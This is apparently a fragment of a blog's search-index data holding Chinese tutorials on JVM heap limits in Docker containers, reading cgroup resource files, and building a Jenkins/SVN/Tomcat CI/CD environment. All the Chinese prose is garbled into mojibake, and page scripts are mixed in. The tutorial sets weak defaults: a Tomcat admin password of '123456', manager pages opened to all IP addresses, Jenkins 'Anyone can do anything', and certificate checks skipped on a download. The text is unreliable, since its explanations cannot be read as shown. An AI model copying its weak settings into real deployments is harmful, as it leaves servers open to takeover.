ä¸æ‰‹åŠ¨æŒ‡å®š Heap å¤§å°ï¼Œåˆ™ JVM é»˜è®¤ Heap å¤§å°å°±ä¸º 2.5Gã€‚JavaSE8 (&lt;8u131) ç‰ˆæœ¬å‰è¿˜æ²¡æœ‰é’ˆå¯¹åœ¨å®¹å™¨å†…æ‰§è¡Œé«˜åº¦å—é™çš„ Linux è¿›ç¨‹è¿›è¡Œä¼˜åŒ–ï¼ŒJDK1.9 ä»¥åå¼€å§‹æ­£å¼æ”¯æŒå®¹å™¨ç¯å¢ƒä¸­çš„ CGroups å†…å­˜é™åˆ¶ï¼ŒJDK1.10 è¿™ä¸ªåŠŸèƒ½å·²ç»é»˜è®¤å¼€å¯ï¼Œå¯ä»¥æŸ¥çœ‹ç›¸å…³ Issueã€‚ç†Ÿæ‚‰ JVM å†…å­˜ç»“æ„çš„äººéƒ½æ¸…æ¥šï¼ŒJVM Heap æ˜¯ä¸€ä¸ªåªå¢ä¸å‡çš„å†…å­˜æ¨¡å‹ï¼ŒHeap çš„å†…å­˜åªä¼šå¾€ä¸Šæ¶¨ï¼Œä¸ä¼šä¸‹é™ã€‚åœ¨å®¹å™¨é‡Œé¢ä½¿ç”¨ Javaï¼Œå¦‚æœä¸º JVM æœªè®¾ç½® Heap å¤§å°ï¼ŒHeap å–å¾—çš„æ˜¯å®¿ä¸»æœºçš„å†…å­˜å¤§å°ï¼Œå½“ Heap çš„å¤§å°è¾¾åˆ°å®¹å™¨å†…å­˜å¤§å°æ—¶å€™ï¼Œå°±ä¼šè§¦å‘ç³»ç»Ÿå¯¹å®¹å™¨ OOMï¼ŒJava è¿›ç¨‹ä¼šå¼‚å¸¸é€€å‡ºã€‚å¸¸è§çš„ç³»ç»Ÿæ—¥å¿—æ‰“å°å¦‚ä¸‹ï¼š 1234567memory: usage 2047696kB, limit 2047696kB, failcnt 23543memory+swap: usage 2047696kB, limit 9007199254740991kB, failcnt 0......Free swap = 0kBTotal swap = 0kB......Memory cgroup out of memory: Kill process 18286 (java) score 933 or sacrifice ... Docker å®¹å™¨å†…ï¼Œæ‰‹åŠ¨è®¾ç½® Java åº”ç”¨çš„å †å†…å­˜å¤§å° 12345# å¯¹äºJavaSE8(&lt;8u131)ç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨åˆ›ä½³å¹¶å¯åŠ¨å®¹å™¨çš„æ—¶å€™ï¼Œé€šè¿‡ç¯å¢ƒå˜é‡ä¼ å‚ç¡®åˆ‡é™åˆ¶æœ€å¤§Heapå¤§å°# docker run -d -m 800M -e JAVA_OPTIONS=\'-Xmx300m\' openjdk:8-jdk-alpine# å¯¹äºJavaSE8(&gt;8u131)ç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ä¸Šé¢æ‰‹åŠ¨æŒ‡å®šæœ€å¤§å †å¤§å°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢åŠæ³•ï¼Œè®¾ç½®è‡ªé€‚åº”å®¹å™¨å†…å­˜é™åˆ¶# docker run -d -m 800M -e JAVA_OPTIONS=\'-XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -XX:MaxRAMFraction=1\' openjdk:8-jdk-alpine ä» CGroups ä¸­æ­£ç¡®è¯»å–å®¹å™¨èµ„æºä¿¡æ¯ Docker åœ¨ 1.8 ç‰ˆæœ¬ä»¥åä¼šå°†åˆ†é…ç»™å®¹å™¨çš„ CGroups ä¿¡æ¯æŒ‚è½½è¿›å®¹å™¨å†…éƒ¨ï¼Œå®¹å™¨é‡Œé¢çš„ç¨‹åºå¯ä»¥é€šè¿‡è§£æ CGroups ä¿¡æ¯è·å–åˆ°å®¹å™¨èµ„æºä¿¡æ¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# æŸ¥çœ‹å®¹å™¨å†…çš„æŒ‚è½½è®°å½•# cat /etc/mtabcgroup /sys/fs/cgroup/systemd cgroup ro,seclabel,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd 0 0cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,seclabel,nosuid,nodev,noexec,relatime,net_prio,net_cls 0 0cgroup /sys/fs/cgroup/cpuset cgroup ro,seclabel,nosuid,nodev,noexec,relatime,cpuset 0 0cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,seclabel,nosuid,nodev,noexec,relatime,cpuacct,cpu 0 0cgroup /sys/fs/cgroup/perf_event cgroup ro,seclabel,nosuid,nodev,noexec,relatime,perf_event 0 0cgroup /sys/fs/cgroup/memory cgroup ro,seclabel,nosuid,nodev,noexec,relatime,memory 0 0cgroup /sys/fs/cgroup/hugetlb cgroup ro,seclabel,nosuid,nodev,noexec,relatime,hugetlb 0 0cgroup /sys/fs/cgroup/freezer cgroup ro,seclabel,nosuid,nodev,noexec,relatime,freezer 0 0cgroup /sys/fs/cgroup/blkio cgroup ro,seclabel,nosuid,nodev,noexec,relatime,blkio 0 0cgroup /sys/fs/cgroup/pids cgroup ro,seclabel,nosuid,nodev,noexec,relatime,pids 0 0cgroup /sys/fs/cgroup/devices cgroup ro,seclabel,nosuid,nodev,noexec,relatime,devices 0 0# è·å–å·²ä½¿ç”¨å†…å­˜çš„å¤§å°ï¼ˆUSAGEï¼‰# cat /sys/fs/cgroup/memory/memory.usage_in_bytes4289953792# è·å–å†…å­˜é™åˆ¶çš„å¤§å°ï¼ˆLIMITï¼‰# cat /sys/fs/cgroup/memory/memory.limit_in_bytes4294967296# è·å–ç£ç›˜I/OçŠ¶å†µ# cat /sys/fs/cgroup/blkio/blkio.throttle.io_service_bytes7:0 Read 122887:0 Write 07:0 Sync 07:0 Async 122887:0 Total 12288......# è·å–å®¹å™¨è™šæ‹Ÿç½‘å¡å…¥å£æµé‡# cat /sys/class/net/eth0/statistics/rx_bytes10167967741# è·å–å®¹å™¨è™šæ‹Ÿç½‘å¡å‡ºå£æµé‡# cat /sys/class/net/eth0/statistics/tx_bytes15139291335# è·å–å®¹å™¨å†…æ˜¯å¦è¢«è®¾ç½®äº†OOMï¼Œæ˜¯å¦å‘ç”Ÿè¿‡OOM# cat /sys/fs/cgroup/memory/memory.oom_controloom_kill_disable 0under_oom 0# oom_kill_disableé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºæ‰“å¼€äº†oom killerï¼Œå°±æ˜¯å½“å†…å­˜è¶…æ—¶ä¼šè§¦å‘killè¿›ç¨‹ã€‚å¯ä»¥åœ¨ä½¿ç”¨docker runæ—¶å€™æŒ‡å®šdisable oomï¼Œå°†æ­¤å€¼è®¾ç½®ä¸º1ï¼Œå…³é—­oom killerï¼›# under_oom è¿™ä¸ªå€¼ä»…ä»…æ˜¯ç”¨æ¥çœ‹çš„ï¼Œè¡¨ç¤ºå½“å‰çš„CGroupsçš„çŠ¶æ€æ˜¯ä¸æ˜¯å·²ç»oomäº†ï¼Œå¦‚æœæ˜¯ï¼Œè¿™ä¸ªå€¼å°†æ˜¾ç¤ºä¸º1ã€‚ LXCFS ä½¿ç”¨ ç”±äºä¹ æƒ¯æ€§ç­‰åŸå› ï¼Œåœ¨å®¹å™¨ä¸­ä½¿ç”¨ topã€free ç­‰å‘½ä»¤ä»ç„¶æ˜¯ä¸€ä¸ªè¾ƒä¸ºæ™®éå­˜åœ¨çš„éœ€æ±‚ï¼Œä½†æ˜¯å®¹å™¨ä¸­çš„ /procã€/sys ç›®å½•ç­‰è¿˜æ˜¯æŒ‚è½½çš„å®¿ä¸»æœºç›®å½•ã€‚å¼€æºé¡¹ç›® LXCFS æ˜¯åŸºäº FUSE å®ç°çš„ä¸€å¥—ç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨ LXCFS å¯ä»¥å®ç°åœ¨å®¹å™¨å†…ç»§ç»­ä½¿ç”¨ free ç­‰å‘½ä»¤ã€‚ä½†æ˜¯ LXCFS ç›®å‰åªæ”¯æŒä¸ºå®¹å™¨ç”Ÿæˆä¸‹é¢åˆ—è¡¨ä¸­çš„æ–‡ä»¶ï¼Œå¦‚æœå‘½ä»¤æ˜¯é€šè¿‡è§£æè¿™äº›æ–‡ä»¶å®ç°çš„ï¼Œé‚£ä¹ˆåœ¨å®¹å™¨é‡Œé¢å¯ä»¥ç»§ç»­ä½¿ç”¨ï¼Œå¦åˆ™åªèƒ½é€šè¿‡è¯»å– CGroups è·å–èµ„æºæƒ…å†µã€‚å¦‚æœå¯¹ä»å®¹å™¨ä¸­å¦‚ä½•è¯»å– CGroups ä¿¡æ¯æ„Ÿå…´è¶£ï¼Œå¯ä»¥äº†è§£ docker stats çš„æºç å®ç°ã€‚ 123456/proc/cpuinfo/proc/diskstats/proc/meminfo/proc/stat/proc/swaps/proc/uptime Docker èµ„æºé™åˆ¶é…ç½® https://blog.csdn.net/candcplusplus/article/details/53728507 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Jenkins å…¥é—¨æ•™ç¨‹ä¹‹äºŒ Jenkins ä¸ SVN æ­å»º CI-CD ç¯å¢ƒ",url:"/posts/44bda657.html",text:'å‰è¨€ æœ¬æ•™ç¨‹å®æˆ˜æ¼”ç¤ºåŸºäº SVN + Jenkins + Maven + JDK + Docker æ­å»º CI/CD ç¯å¢ƒï¼Œå…¶ä¸­ SVN åŸºäº Debian é•œåƒæ‰‹åŠ¨å®‰è£…ï¼Œè€Œ Jenkinsã€Mavenã€JDK åˆ™åŸºäº Tomcat é•œåƒæ‰‹åŠ¨å®‰è£…ã€‚å¦‚æœä»…ä¸ºäº†å¿«é€Ÿä½“éªŒä½¿ç”¨ Jenkins çš„åŠŸèƒ½ï¼Œå¯ä»¥ç›´æ¥ Pull Jenkins å®˜æ–¹çš„ Docker é•œåƒï¼Œç„¶ååˆ›å»ºå¹¶å¯åŠ¨ Docker å®¹å™¨æ¥ä½“éªŒ Jenkins ç›¸å…³åŠŸèƒ½ï¼Œæ­¤æ—¶å¯å¿½ç•¥ä¸‹é¢æ•™ç¨‹ä¸­çš„å¤§éƒ¨åˆ†æ“ä½œæ­¥éª¤ã€‚ Docker ç¯å¢ƒå®‰è£…ä¸é…ç½® ç«™å†…æ•™ç¨‹ï¼šDocker ä»‹ç»ä¸å®‰è£… åŸºäº Docker æ­å»º SVN æœåŠ¡å™¨ ç«™å†…æ•™ç¨‹ï¼šé€šè¿‡ Apacheã€Subversion æ­å»º SVN æœåŠ¡å™¨ï¼Œå®ç°ä½¿ç”¨ HTTP/SVN åè®®è®¿é—® SVN ä»“åº“ 123456789101112131415161718192021# æ‹‰å–Debiané•œåƒ# docker pull debian# åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼Œ80æ˜¯Apacheç«¯å£ï¼Œ3690æ˜¯Subversionç«¯å£ï¼Œ/var/lib/svnæ˜¯æ‰€æœ‰SVNä»“åº“çš„çˆ¶ç›®å½•# docker run -it -p 9126:80 -p 4690:3690 --name svn-httpd \\ -v /container/svn-server:/var/lib/svn \\ -d debian# è¿æ¥å®¹å™¨# docker exec -it svn-httpd /bin/bash# ä¿®æ”¹ç³»ç»Ÿæ—¶é—´# ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime# å‚è€ƒä¸Šé¢ç»™å‡ºçš„æœ¬ç«™æ•™ç¨‹ï¼Œä½¿ç”¨Apacheã€Subversionæ­å»ºSVNæœåŠ¡å™¨# æ–­å¼€å®¹å™¨è¿æ¥ï¼Œä¸åœæ­¢è¿è¡Œå®¹å™¨# ctrl + p + q# æœ€åå¦‚æœSubversionå®¹å™¨èƒ½æ­£å¸¸å·¥ä½œï¼Œå»ºè®®æ‰§è¡Œcommitæ“ä½œç”ŸæˆDockerå¤‡ä»½é•œåƒ# docker commit -a "clay@gmail.com" -m "commit jenkins-svn-httpd image" svn-httpd clay/jenkins-svn-httpd:1.0 åŸºäº Docker æ­å»º Tomcat æœåŠ¡å™¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# æ‹‰å–Tomcat8çš„é•œåƒ# docker pull tomcat:8# åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨# docker run -p 8888:8080 --name tomcat8 \\ -v /container/tomcat8/logs:/usr/local/tomcat/logs \\ -d tomcat:8# è¿æ¥å®¹å™¨# docker exec -it tomcat8 /bin/bash# æ›´æ–°ç³»ç»Ÿå¹¶å®‰è£…å¸¸ç”¨è½¯ä»¶ï¼ŒDockerå®˜æ–¹çš„Tomcaté•œåƒé»˜è®¤å®‰è£…äº†Open-JDKã€Tomcat Nativeã€APRï¼Œå…·ä½“å®‰è£…ç»†èŠ‚å¯ä»¥å‚è€ƒå®˜æ–¹é•œåƒçš„Dockerfileæ–‡ä»¶# apt-get -y update# apt-get -y upgrade# apt-get -y install git vim htop telnet net-tools# ä¿®æ”¹ç³»ç»Ÿæ—¶é—´# ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime# é…ç½®Tomcat8çš„ç®¡ç†ç”¨æˆ·ï¼Œç¼–è¾‘Tomcat8å¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼Œåœ¨&lt;tomcat-users&gt;æ ‡ç­¾å†…æ·»åŠ ä»¥ä¸‹å†…å®¹# vim /usr/local/tomcat/conf/tomcat-users.xml&lt;tomcat-users&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;user username="admin" password="123456" roles="admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status"/&gt;&lt;/tomcat-users&gt;# å…³äºTomcaté…ç½®ç®¡ç†ç”¨æˆ·ï¼Œä¸åŒç‰ˆæœ¬çš„Tomcaté…ç½®æ–¹æ³•æœ‰å·®å¼‚ï¼Œä¸Šé¢ä»…æ¼”ç¤ºTomcat8ç‰ˆæœ¬çš„é…ç½®æ–¹æ³•ã€‚# ç”±äºTomcat8é»˜è®¤å¯ç”¨äº†ç½‘æ®µé™åˆ¶ï¼Œé»˜è®¤åªæœ‰127ç½‘æ®µå±€åŸŸç½‘çš„æœºå™¨æ‰æ‹¥æœ‰æœ‰è®¿é—®æƒé™ï¼Œå¦‚æœæ˜¯å…¶ä»–ç½‘æ®µç™»é™†ï¼Œå¦‚172ï¼Œ10ç½‘æ®µä¼šæŠ¥403é”™è¯¯ï¼Œå› æ­¤éœ€è¦æŒ‰ç…§ä¸‹é¢çš„æ–¹æ³•ä¿®æ”¹å¯¹åº”çš„context.xmlé…ç½®æ–‡ä»¶ã€‚# å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å»ºè®®å¯ç”¨é»˜è®¤çš„ç½‘æ®µé™åˆ¶ï¼Œå³åªå…è®¸åœ¨æœ¬åœ°è®¿é—®TomcatæœåŠ¡å™¨çš„ç®¡ç†é¡µé¢ã€‚# ç¼–è¾‘manageré¡¹ç›®ä¸‹çš„META-INF/context.xmlé…ç½®æ–‡ä»¶ï¼Œå°†&lt;Valve&gt;æ ‡ç­¾çš„å†…å®¹æ›¿æ¢ä¸ºä»¥ä¸‹æ–‡æœ¬# vim /usr/local/tomcat/webapps/manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# ç¼–è¾‘host-manageré¡¹ç›®ä¸‹çš„META-INF/context.xmlé…ç½®æ–‡ä»¶ï¼Œå°†&lt;Valve&gt;æ ‡ç­¾çš„å†…å®¹æ›¿æ¢ä¸ºä»¥ä¸‹æ–‡æœ¬# vim /usr/local/tomcat/webapps/host-manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# æ–­å¼€å®¹å™¨è¿æ¥# exit# é‡å¯å®¹å™¨ä½¿é…ç½®ç”Ÿæ•ˆ# docker restart tomcat8# é€šè¿‡æµè§ˆå™¨è®¿é—®Tomcatçš„ç®¡ç†é¡µé¢ï¼Œæµ‹è¯•æ˜¯å¦é…ç½®æˆåŠŸ# æœ€åå¦‚æœTomcatå®¹å™¨èƒ½æ­£å¸¸å·¥ä½œï¼Œå»ºè®®æ‰§è¡Œcommitæ“ä½œç”ŸæˆDockerå¤‡ä»½é•œåƒ# docker commit -a "clay@gmail.com" -m "commit jenkins-server image" tomcat8 clay/jenkins-server:1.0 Tomcat å®¹å™¨å†…å®‰è£…ä¸é…ç½® Oracle JDKã€Maven 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# æç¤ºï¼šè¿™é‡Œå®‰è£…çš„Oracle JDKã€Mavenï¼Œåœ¨åé¢Jenkinsçš„å…¨å±€å·¥å…·é…ç½®ä¸­ä¼šç”¨åˆ°# è¿æ¥å®¹å™¨# docker exec -it tomcat8 /bin/bash# ä¸‹è½½Oracle JDK8# wget -P /usr/local --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3a%2F%2Fwww.oracle.com%2Ftechnetwork%2Fjava%2Fjavase%2Fdownloads%2Fjdk8-downloads-2133151.html; oraclelicense=accept-securebackup-cookie;" "https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk1.8.0_201-linux-x64.tar.gz"# è§£å‹Oracle JDK8# tar -xvf /usr/local/jdk1.8.0_201-linux-x64.tar.gz# ä¸‹è½½Maven# wget -P /usr/local/ http://mirrors.shu.edu.cn/apache/maven/maven-3/3.6.0/binaries/apache-maven-3.6.0-bin.tar.gz# è§£å‹Maven# tar -xvf /usr/local/apache-maven-3.6.0-bin.tar.gz# åˆ é™¤ä¸‹è½½æ–‡ä»¶# rm /usr/local/jdk1.8.0_201-linux-x64.tar.gz# rm /usr/local/apache-maven-3.6.0-bin.tar.gz# åˆ›å»ºJavaå‘½ä»¤çš„è½¯é“¾æ¥ï¼Œå¦‚æœå®‰è£…äº†Open-JDKï¼Œä¼šè¦†ç›–Open-JDKç›¸å…³å‘½ä»¤# ln -s -f /usr/local/jdk1.8.0_201/bin/java /usr/bin/java# ln -s -f /usr/local/jdk1.8.0_201/bin/javac /usr/bin/javac# é…ç½®JDKã€Mavençš„ç¯å¢ƒå˜é‡ï¼Œåœ¨é…ç½®æ–‡ä»¶æœ«å°¾è¿½åŠ ä»¥ä¸‹å†…å®¹å³å¯# æ³¨æ„ï¼Œåœ¨/etc/profileé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ç¯å¢ƒå˜é‡åï¼Œé‡å¯Dockerå®¹å™¨åç¯å¢ƒå˜é‡ä¼šå¤±æ•ˆï¼Œå»ºè®®åœ¨DockerFileä¸­æ·»åŠ ç¯å¢ƒå˜é‡ï¼Œç„¶åé€šè¿‡DockerFileæ„å»ºå¾—åˆ°Dockeré•œåƒ# vim /etc/profileJAVA_HOME=/usr/local/jdk1.8.0_201JRE_HOME=/usr/local/jdk1.8.0_201/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATHMAVEN_HOME=/usr/local/apache-maven-3.6.0PATH=$PATH:$MAVEN_HOME/binexport MAVEN_HOME PATH# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile# éªŒè¯ç¯å¢ƒå˜é‡æ˜¯å¦ç”Ÿæ•ˆ# mvn -version# java -version# javac -version# æœ€åå¦‚æœä¸Šé¢çš„é…ç½®éƒ½ç”Ÿæ•ˆäº†ï¼Œå»ºè®®æ‰§è¡Œcommitæ“ä½œç”ŸæˆDockerå¤‡ä»½é•œåƒ# docker commit -a "clay@gmail.com" -m "commit jenkins-server image" tomcat8 clay/jenkins-server:1.1 Tomcat å®¹å™¨å†…å®‰è£… Jenkins Jenkins æœ¬è´¨æ˜¯ä¸€ä¸ª Java å¼€å‘çš„ Web é¡¹ç›®ï¼Œå®˜æ–¹å‘å¸ƒæ–¹å¼æœ‰ War æ–‡ä»¶ã€Native åŒ…ã€å®‰è£…ç¨‹åºã€Docker é•œåƒï¼ŒJenkins å®˜æ–¹ä¸‹è½½é¡µé¢ã€‚ 12345678910111213141516171819202122232425# è¿æ¥å®¹å™¨# docker exec -it tomcat8 /bin/bash# ä¸‹è½½Waræ–‡ä»¶åˆ°Tomcatçš„webappsç›®å½•# wget -P /usr/local/tomcat/webapps https://mirrors.tuna.tsinghua.edu.cn/jenkins/war-stable/2.150.2/jenkins.war# ç¼–è¾‘server.xmlé…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹Tomcat URIåœ°å€çš„ç¼–ç è§£ç å­—ç¬¦é›†ä¸ºUTF-8# vim /usr/local/tomcat/conf/server.xml&lt;Connector port="8080" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" URIEncoding="UTF-8"/&gt;# æ–­å¼€å®¹å™¨è¿æ¥# exit# é‡å¯å®¹å™¨# docker restart tomcat8# æµè§ˆå™¨è®¿é—®ä»¥ä¸‹åœ°å€æµ‹è¯•Jenkinsæ˜¯å¦å¯åŠ¨æˆåŠŸï¼Œé¦–æ¬¡è®¿é—®Jenkinsçš„ç®¡ç†é¡µé¢ï¼Œä¼šæç¤ºè¿›è¡Œè§£é”æ“ä½œhttp://127.0.0.1:8888/jenkins# å¦‚æœJenkinså¯åŠ¨å¤±è´¥ï¼Œå¯ä»¥é€šè¿‡è¾“å…¥ä»¥ä¸‹åœ°å€æŸ¥çœ‹Jenkinsçš„æ—¥å¿—ä¿¡æ¯æˆ–è€…æŸ¥çœ‹Tomcatçš„æ—¥å¿—ä¿¡æ¯æ¥å®šä½é—®é¢˜http://localhost:8888/jenkins/log/all# æç¤ºï¼šJenkinsé»˜è®¤çš„æ•°æ®ç›®å½•æ˜¯ï¼š/root/.jenkins (adsbygoogle = window.adsbygoogle || []).push({}); è§£é” Jenkins 12345# è¿æ¥å®¹å™¨# docker exec -it tomcat8 /bin/bash# æŸ¥çœ‹Jenkinsè‡ªåŠ¨ç”Ÿæˆçš„ç®¡ç†å¯†ç ï¼Œå¹¶å°†ç®¡ç†å¯†ç å¡«å†™åˆ°Jenkinsçš„è§£é”é¡µé¢ä¸­ï¼Œè¿™é‡Œçš„ç®¡ç†å¯†ç åŒæ—¶ä¹Ÿæ˜¯adminè´¦å·çš„ç™»å½•å¯†ç # cat /root/.jenkins/secrets/initialAdminPassword å®‰è£… Jenkins æ’ä»¶ è§£é”åä¼šè·³è½¬åˆ° â€œè‡ªå®šä¹‰ Jenkinsâ€ é¡µé¢ï¼Œé¡µé¢ä¸­é€‰æ‹©å“ªç§æ–¹å¼æ¥å®‰è£…æ’ä»¶éƒ½ä¸ä¼šå¯¹åç»­æ“ä½œæœ‰å¤ªå¤§å½±å“ï¼›å› ä¸ºæœ‰éœ€è¦çš„æ’ä»¶å¯ä»¥åœ¨åç»­æœ‰é’ˆå¯¹æ€§åœ°å®‰è£…ï¼Œæœ¬æ–‡é€‰æ‹© â€œå®‰è£…æ¨èçš„æ’ä»¶â€ã€‚ åˆ›å»º Jenkins ç®¡ç†å‘˜ç”¨æˆ· æ ¹æ®é¡µé¢æç¤ºåˆ›å»ºç®¡ç†å‘˜ç”¨æˆ·ï¼Œè¡¨å•å¡«å†™å®Œåç‚¹å‡»â€Save and Continueâ€ æŒ‰é’®ä¿å­˜è®¾ç½®ï¼Œè¿™é‡Œçš„ç®¡ç†å‘˜ç”¨æˆ·åŒºåˆ«äº Jenkins è‡ªåŠ¨åˆ›å»ºçš„ admin ç”¨æˆ·ã€‚ é…ç½® Jenkins å®ä¾‹ ä¸€èˆ¬ä½¿ç”¨é»˜è®¤çš„ Jenkins URL å³å¯ã€‚ ç™»å½• Jenkins ç®¡ç†åå° æµè§ˆå™¨è¾“å…¥ Jenkins ç®¡ç†åå°çš„ç™»å½•åœ°å€ï¼Œå¡«å†™ä¸Šé¢åˆ›å»ºçš„ç®¡ç†å‘˜æˆ–è€… admin è´¦å·å’Œå¯†ç å³å¯ç™»å½•ã€‚å¦‚æœç™»å½•åçš„é¡µé¢åªæ˜¾ç¤ºç©ºç™½é¡µé¢ï¼Œå¯ä»¥å°è¯•é‡å¯ Tomcat æœåŠ¡å™¨å†è®¿é—® URLï¼šhttp://127.0.0.1:8888/jenkins/login Jenkins æ”¯æŒä¸­æ–‡ç•Œé¢ Manage Jenkins â€“&gt; Manage Plugins â€“&gt; Available â€“&gt; æœç´¢å…³é”®å­—â€Localâ€ â€“&gt; é€‰ä¸­ Local æ’ä»¶è¿›è¡Œå®‰è£…ï¼Œå»ºè®®å®‰è£…å®Œä¹‹åæ‰‹åŠ¨é‡å¯ Tomcat æœåŠ¡å™¨ã€‚ Jenkins å¼€å¯ç”¨æˆ·æ³¨å†ŒåŠŸèƒ½ Manage Jenkins â€“&gt; Configure Global Security â€“&gt; å‹¾é€‰â€Allow users to sign upâ€ â€“&gt; ç‚¹å‡»â€Saveâ€ æŒ‰é’®ä¿å­˜è®¾ç½®ã€‚å¦‚æœæ˜¯å¤„äºå­¦ä¹ æˆ–è€…æµ‹è¯•é˜¶æ®µï¼Œè¿˜å¯ä»¥å‹¾é€‰ â€œAnyone can do anythingâ€ï¼Œè¿™æ ·æ›´æ–¹ä¾¿æµ‹è¯• Jenkins çš„åŠŸèƒ½ã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œç”Ÿäº§ç¯å¢ƒä¸‹è®°å¾—å–æ¶ˆå‹¾é€‰æ­¤é¡¹ã€‚ Jenkins å…¨å±€å·¥å…·é…ç½® Manage Jenkins â€“&gt; Global Tool Configuration â€“&gt; æŒ‡å®š Maven çš„é…ç½®æ–‡ä»¶è·¯å¾„ã€JDK çš„å®‰è£…è·¯å¾„ã€Maven çš„å®‰è£…è·¯å¾„ â€“&gt; ç‚¹å‡»â€Saveâ€ æŒ‰é’®ä¿å­˜è®¾ç½®ã€‚ä¸è¦é€‰æ‹©è‡ªåŠ¨å®‰è£…ï¼Œå› ä¸ºä¸Šé¢å·²ç»æ‰‹åŠ¨å®‰è£…å¹¶é…ç½®å¥½ Mavenã€Oracle JDKã€‚ å®‰è£… deploy to container æ’ä»¶ åˆ°æ­¤ä¸ºæ­¢ï¼ŒåŸºäº SVN + Jenkins + Maven + JDK + Docker çš„ CI/CD ç¯å¢ƒå·²ç»æ­å»ºå®Œæˆã€‚ ä¸‹ç¯‡ï¼šJenkins å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰ Jenkins ä¸ SVN æŒç»­é›†æˆå®æˆ˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd"},{title:"Jenkins å…¥é—¨æ•™ç¨‹ä¹‹ä¸€ Jenkins ä»‹ç»",url:"/posts/dbce0754.html",text:'Jenkins ç›¸å…³ç«™ç‚¹ Jenkins å®˜ç½‘ Jenkins å®˜æ–¹æ–‡æ¡£ å®˜æ–¹ Jenkins Docker é•œåƒçš„ä½¿ç”¨è¯´æ˜æ–‡æ¡£ Jenkins ä¸ Hundson ä»‹ç» Jenkins ä¸ Hundson æ˜¯ç›®å‰æœ€æµè¡Œçš„æŒç»­é›†æˆåŠè‡ªåŠ¨åŒ–éƒ¨ç½²å·¥å…·ï¼ŒåŸºäº Java è¯­è¨€å¼€å‘ï¼ŒäºŒè€…å¸ˆå‡ºåŒé—¨ã€‚2009 å¹´ç”²éª¨æ–‡æ”¶è´­äº† Sun å…¬å¸å¹¶ç»§æ‰¿äº† Hudson ä»£ç åº“ã€‚åœ¨ 2011 å¹´å¹´åˆï¼Œç”²éª¨æ–‡å’Œå¼€æºç¤¾åŒºä¹‹é—´çš„å…³ç³»ç ´è£‚ï¼Œè¯¥é¡¹ç›®è¢«åˆ†æˆä¸¤ä¸ªç‹¬ç«‹çš„é¡¹ç›® Jenkins å’Œ Hundsonã€‚å…¶ä¸­ Jenkins çš„å›¢é˜Ÿç”±å¤§éƒ¨åˆ†åŸå§‹å¼€å‘äººå‘˜ç»„æˆï¼ŒHudson 